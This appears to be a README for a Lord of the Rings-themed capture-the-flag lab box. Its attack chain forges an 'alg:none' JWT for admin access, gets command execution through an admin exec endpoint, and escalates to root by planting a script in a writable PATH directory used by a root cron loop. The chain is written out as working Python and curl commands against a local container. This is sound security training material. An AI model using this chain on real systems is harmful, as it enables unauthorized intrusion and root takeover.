# Hill 7 - Barad-dur Watchtower (JWT alg:none -> admin RCE -> PATH hijack)

*Theme: LOTR / Mordor.* The watchtower authenticates with a JWT whose verifier
trusts the header's `alg` field - set `alg:none` and it accepts an unsigned token.

- **Entry:** forge `{"alg":"none"}` + `{"role":"admin"}`, present it to
  `GET /admin/exec?auth=<jwt>&cmd=...` -> command execution. Foothold: `watch`.
  Port 80 (8087 locally).
- **Privesc:** a root "cron" loop runs `keeper` with `/opt/watchbin` first on `PATH`,
  and that dir is writable by `watch` (**PATH hijack**). Drop your own `keeper` there;
  it runs as root within ~4s. Restored on reset.
- **Flags:** `user.txt` (foothold) and `/root/root.txt` (root).

## Attack chain

    # 1. forge an alg:none admin token
    FORGE=$(python3 - <<'PY'
    import base64,json
    e=lambda b: base64.urlsafe_b64encode(b).decode().rstrip('=')
    print(e(b'{"alg":"none","typ":"JWT"}')+'.'+e(b'{"user":"sauron","role":"admin"}')+'.')
    PY
    )
    # 2. RCE as watch -> read the user flag
    curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$FORGE" \
      --data-urlencode 'cmd=cat /home/watch/user.txt'

    # 3. privesc: drop a root-run keeper (PATH hijack) that reads root.txt / writes king.txt
    curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$FORGE" --data-urlencode \
      'cmd=printf "#!/bin/sh\ncat /root/root.txt > /tmp/r; chmod 666 /tmp/r\n" > /opt/watchbin/keeper; chmod 755 /opt/watchbin/keeper'
    sleep 5
    curl -s -G http://127.0.0.1:8087/admin/exec --data-urlencode "auth=$FORGE" --data-urlencode 'cmd=cat /tmp/r'

## Run locally

    docker compose up -d --build   # app: http://localhost:8087/
